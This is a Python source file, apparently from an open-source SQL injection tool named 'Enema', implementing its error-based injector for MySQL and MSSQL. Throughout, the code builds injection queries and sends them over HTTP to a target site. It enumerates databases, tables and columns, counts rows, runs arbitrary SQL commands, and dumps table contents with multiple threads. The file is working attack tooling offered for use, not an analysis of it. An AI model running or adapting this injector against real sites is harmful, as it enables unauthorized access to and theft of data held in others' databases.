"""
    Enema module (core): Error-based injector
    Copyright (C) 2011 Kaeso
    
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
"""

import sys
import time
import core.txtproc
from core.http import HTTP_Handler
from PyQt4 import QtCore
import threading
from queue import Queue


class ErrorBased(QtCore.QThread):
    
    #---------------Signals---------------#
    logSignal = QtCore.pyqtSignal(str)
    progressSignal = QtCore.pyqtSignal(int, bool)
    dumpProgressSignal = QtCore.pyqtSignal(int, bool)
    msgSignal = QtCore.pyqtSignal(str)
    dbSignal = QtCore.pyqtSignal(str)
    columnSignal = QtCore.pyqtSignal(str, int)
    rowDataSignal = QtCore.pyqtSignal(int, int, str)
    querySignal = QtCore.pyqtSignal(str)
    tblCountSignal = QtCore.pyqtSignal(str)
    tblSignal = QtCore.pyqtSignal(str)
    #----------------------------------------#
    
    def __init__(self, vars, qstrings):
        QtCore.QThread.__init__(self)
        self.wq = HTTP_Handler()
        self.vars = vars
        self.qstrings = qstrings
        self.killed = False
        self.wq.logSignal.connect(self.logger)
        
    def run(self):
        self.logSignal.emit("\n+++ TASK STARTED +++")
        if self.vars['task'] == "tables": self.getTables()
        elif self.vars['task'] == "count": self.getCountInTable()
        elif self.vars['task'] == "bases" : self.getBases()
        elif self.vars['task'] == "columns": self.getColumns()
        elif self.vars['task'] == "query":self.runQuery()
        elif self.vars['task'] == "dump": self.syncThreads()
        self.logSignal.emit("\n*** TASK STOPPED ***")
        
    def kill(self):
        if self.isRunning():
            self.logSignal.emit("\n\n!!! KILL SIGNAL RECIEVED !!!")
        self.killed = True
        
    def setVars(self, vars, qstrings):
        self.vars = vars
        self.qstrings = qstrings
        
#Log
    def logger(self, strValue, notFunction=True):
        if notFunction:
            self.logSignal.emit(strValue)
            return
        self.logSignal.emit("\n - [x] 'no_content' returned by function " + strValue)
        self.progressSignal.emit(0, True)
        
    #Current db type selected
    def dbType(self, todo):
        if self.vars['db_type'] == "mysql":
            qstring = self.qstrings['mysql_error_based'][todo]
        else:
            qstring = self.qstrings['mssql_error_based'][todo]
        return core.txtproc.correctQstr(qstring)   
        
#Get current database
    def getCurrDb(self):
        if self.vars['dbListCount'] < 1:
            query = self.wq.buildQuery(self.dbType('curr_db_name'), self.vars)
            db_name = self.wq.httpRequest(query, False, self.vars)
            if db_name == "no_content": 
                self.logger(sys._getframe().f_code.co_name + "() -> db_name", False)
                return 'no_db'
            self.dbSignal.emit(db_name)
        else:
            db_name = self.vars['dbName']
        return db_name
        
#Getting bases
    def getBases(self):
        #If not in (array) method selected
        if self.vars['notInArray']:
            current_db = self.vars['dbName']
            self.vars['cdb'] = current_db
            while True:
                if self.killed:
                    break
                query = self.wq.buildQuery(self.dbType('get_db_name'), self.vars)
                db_name = self.wq.httpRequest(query, False, self.vars)
                if db_name == "no_content":
                    self.logger(sys._getframe().f_code.co_name + "() -> db_name", False)
                    return
                elif db_name == "isnull":
                    break
                self.vars['cdb'] += ",'" + db_name + "'"
                self.dbSignal.emit(db_name)
            self.progressSignal.emit(0, True)
        #not in (substring) method realisation
        else:
            query = self.wq.buildQuery(self.dbType('dbs_count'), self.vars)
            dbCount = self.wq.httpRequest(query, False, self.vars)
            tQueue = Queue()
            for tNum in range(int(dbCount)):  
                tQueue.put(tNum)
            for i in range(self.vars['threads']):  
                t = threading.Thread(target=self.mtBases, args=(tNum, tQueue, dbCount)) 
                t.start()
                time.sleep(0.1)

#Multithread tables
    def mtBases(self, tNum, tQueue, dbCount):
        while True:  
            if self.killed:
                break
            try:  
                tNum = tQueue.get_nowait()
            except Exception:  
                break
            self.vars['num'] = str(tNum)
            query = self.wq.buildQuery(self.dbType('get_db_name2'), self.vars)
            db_name = self.wq.httpRequest(query, False, self.vars)
            if db_name == "no_content":
                self.logger(sys._getframe().f_code.co_name + "() -> db_name", False)
                return
            self.dbSignal.emit(db_name)
            time.sleep(0.1)
            tQueue.task_done()
            self.progressSignal.emit(int(dbCount) - 1, False)
        self.progressSignal.emit(0, True)

#Getting tables
    def getTables(self):
        current_db = self.getCurrDb()
        if current_db == 'no_db':
            return
        self.vars['cdb'] = current_db
        query = self.wq.buildQuery(self.dbType('tbls_count'), self.vars)
        tblCount = self.wq.httpRequest(query, False, self.vars)
        if tblCount == "no_content": 
            self.logger(sys._getframe().f_code.co_name + "() -> tblCount", False)
            return
        self.tblCountSignal.emit(tblCount)
        if self.vars['notInArray']:
            current_table = ""
            while not self.killed:
                self.vars['ctbl'] = current_table
                query = self.wq.buildQuery(self.dbType('get_tbl_name'), self.vars)
                table_name = self.wq.httpRequest(query, False, self.vars)
                if table_name == "no_content":
                    self.logger(sys._getframe().f_code.co_name + "() -> table_name", False)
                    return
                elif table_name == "isnull":
                    break
                current_table += ",'" + table_name + "'"
                self.tblSignal.emit(table_name)
                self.progressSignal.emit(int(tblCount), False)
            self.progressSignal.emit(0, True)
        else:
            tQueue = Queue()
            for tNum in range(int(tblCount)):  
                tQueue.put(tNum)
            for i in range(self.vars['threads']):  
                t = threading.Thread(target=self.mtTables, args=(tNum, tQueue,  tblCount, current_db)) 
                t.start()
                time.sleep(0.1)
        
#Multithread tables
    def mtTables(self, tNum, tQueue, tblCount, current_db):
        while True:  
            if self.killed:
                break
            try:  
                tNum = tQueue.get_nowait()
            except Exception:  
                break
            self.vars['num'] = str(tNum)
            self.vars['cdb'] = current_db
            query = self.wq.buildQuery(self.dbType('get_tbl_name2'), self.vars)
            table_name = self.wq.httpRequest(query, False, self.vars)
            if table_name == "no_content":
                self.logger(sys._getframe().f_code.co_name + "() -> table_name", False)
                return
            self.tblSignal.emit(table_name)
            time.sleep(0.1)
            tQueue.task_done()
            self.progressSignal.emit(int(tblCount) - 1, False)
        self.progressSignal.emit(0, True)
        
#Getitng columns
    def getColumns(self):
        current_db = self.getCurrDb()
        if current_db == 'no_db':
            return
        tables = self.vars['tables']
        self.vars['cdb'] = current_db
        #If not in(array) method selected:
        if self.vars['notInArray']: 
            for i in range (self.vars['tblTreeCount']):
                current_table = core.txtproc.strToSqlChar(tables[i], self.vars['db_type'])
                self.vars['ctbl'] = current_table
                current_column = ""
                query = self.wq.buildQuery(self.dbType('columns_count'), self.vars)
                columnsInTable = self.wq.httpRequest(query, False, self.vars)
                if columnsInTable == "no_content": 
                    self.logger(sys._getframe().f_code.co_name + "() -> notInArray -> columnsinTable", False)
                    return
                while True:
                    if self.killed:
                        break
                    self.vars['ccol'] = current_column
                    query = self.wq.buildQuery(self.dbType('get_column_name'), self.vars)
                    column_name = self.wq.httpRequest(query, False, self.vars)
                    if column_name == "no_content":
                        self.logger(sys._getframe().f_code.co_name + "() -> notInArray -> column_name", False)
                        return
                    elif column_name == "isnull":
                        break
                    current_column += ",'" + column_name + "'"
                    self.columnSignal.emit(column_name, i)
                    self.progressSignal.emit(int(columnsInTable), False)
            self.progressSignal.emit(0, True)
        #If not in (substring - MSSQL) or LIMIT(MySQL) method selected
        else:
            for i in range (self.vars['tblTreeCount']):
                current_table = core.txtproc.strToSqlChar(tables[i], self.vars['db_type'])
                self.vars['ctbl'] = current_table
                query = self.wq.buildQuery(self.dbType('columns_count'), self.vars)
                columnsInTable = self.wq.httpRequest(query, False, self.vars)
                if columnsInTable == "no_content": 
                    self.logger(sys._getframe().f_code.co_name + "() -> columnsinTable", False)
                    return
                for rowid in range(int(columnsInTable)):
                    if self.killed:
                        return
                    self.vars['num'] = str(rowid)
                    #If not in(substring) method selected:
                    if self.vars['notInSubstring']:
                        query = self.wq.buildQuery(self.dbType('get_column_name2'), self.vars)
                    #If ordinal_position method selected:
                    elif self.vars['ordinal_position']:
                        rowid += 1
                        self.vars['num'] = str(rowid)
                        query = self.wq.buildQuery(self.dbType('get_column_name3'), self.vars)
                    column_name = self.wq.httpRequest(query, False, self.vars)
                    if column_name == "no_content":
                        self.logger(sys._getframe().f_code.co_name + "() -> notInSubstring -> column_name", False)
                        return
                    self.columnSignal.emit(column_name, i)
                    self.progressSignal.emit(int(columnsInTable), False)
            self.progressSignal.emit(0, True)
            
#Show rows count in selected table
    def getCountInTable(self):
        current_db = self.getCurrDb()
        if current_db == 'no_db':
            return
        self.vars['cdb'] = current_db
        query = self.wq.buildQuery(self.dbType('rows_count'), self.vars)
        rowsInTable = self.wq.httpRequest(query, False, self.vars)
        if rowsInTable == "no_content":
            self.logger(sys._getframe().f_code.co_name + "() -> rowsInTable", False)
            return
        msg = (rowsInTable + " rows in " + self.vars['selected_table'])
        self.msgSignal.emit(msg)
        
#Run Query     
    def runQuery(self):
        #If this select command
        if self.vars['querySelect']:
            query = self.wq.buildQuery(self.dbType('query'), self.vars)
            result = self.wq.httpRequest(query, False, self.vars)
        else:
            result = "NULL"
            self.wq.httpRequest(self.vars['query_cmd'], True, self.vars)
        self.querySignal.emit(result)

 #Making synchronized threads for dumper
    def syncThreads(self):
        current_db = self.getCurrDb()
        if current_db == 'no_db':
            return
        self.vars['cdb'] = current_db
        columns = self.vars['columns']
        for num in range (len(columns)):
            tQueue = Queue()
            for tNum in range(self.vars['fromPos'] + 1, self.vars['toPos'] + 1):
                tQueue.put(tNum)
            for i in range(self.vars['threads']): 
                self.vars['column'] = str(columns[num])
                self.vars['num'] = str(tNum)
                t = threading.Thread(target=self.doDump, args=(tNum, tQueue, self.vars))  
                t.start()
                time.sleep(0.1)
            
#Data dumping           
    def doDump(self, tNum, tQueue, vars):
        while not self.killed:
            try:  
                tNum = tQueue.get_nowait()
            except Exception:  
                break
            query = self.wq.buildQuery(self.dbType('data_dump'), vars)
            rowData = self.wq.httpRequest(query, False, vars)
            if rowData == "no_content":
                rowData = "NULL"
            self.rowDataSignal.emit(tNum, vars['num'], rowData)
            time.sleep(0.1)
            tQueue.task_done()
            self.dumpProgressSignal.emit(0, False)
        self.dumpProgressSignal.emit(0, True)
        
